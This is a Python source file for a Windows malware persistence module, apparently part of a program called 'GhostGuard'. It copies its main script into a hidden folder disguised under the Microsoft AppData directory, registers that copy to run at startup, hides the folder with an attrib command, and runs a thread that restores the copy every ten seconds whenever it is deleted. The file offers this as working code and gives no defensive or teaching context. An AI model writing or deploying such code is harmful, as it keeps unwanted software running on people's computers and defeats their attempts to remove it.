import os
import shutil
import time
import threading
from pathlib import Path
from auto_start import enable_auto_start


class Persistence:
    def __init__(self, app_name="GhostGuard"):
        self.app_name = app_name
        self.hidden_dir = os.path.join(Path.home(), "AppData", "Roaming", "Microsoft", self.app_name)
        self.main_script_name = "main.py"  # The script to persist
        self.original_path = os.path.abspath("main.py")

    def setup(self):
        """Copy the script to a hidden directory and enable auto-start"""
        try:
            if not os.path.exists(self.hidden_dir):
                os.makedirs(self.hidden_dir)
                print(f"[+] Created hidden directory: {self.hidden_dir}")

            target_script = os.path.join(self.hidden_dir, self.main_script_name)

            # Copy only if it doesn't already exist
            if not os.path.exists(target_script):
                shutil.copy(self.original_path, target_script)
                print(f"[+] Script copied to: {target_script}")
            else:
                print(f"[!] Script already exists in hidden folder.")

            # Add to startup using copied path
            enable_auto_start(self.app_name, script_path=target_script)

            # Optionally make the folder hidden (Windows only)
            os.system(f'attrib +h "{self.hidden_dir}"')

        except Exception as e:
            print(f"[!] Persistence setup failed: {e}")

    def monitor_self(self):
        """Monitors the persisted file and restores it if deleted"""
        def monitor():
            target_script = os.path.join(self.hidden_dir, self.main_script_name)
            while True:
                if not os.path.exists(target_script):
                    print("[!] Persisted file missing. Restoring...")
                    try:
                        shutil.copy(self.original_path, target_script)
                        print("[+] Restored missing script.")
                    except Exception as e:
                        print(f"[!] Failed to restore script: {e}")
                time.sleep(10)

        thread = threading.Thread(target=monitor, daemon=True)
        thread.start()


# Example for testing
if __name__ == "__main__":
    p = Persistence()
    p.setup()
    p.monitor_self()
    # Keep the main thread alive to allow monitoring
    while True:
        time.sleep(60)
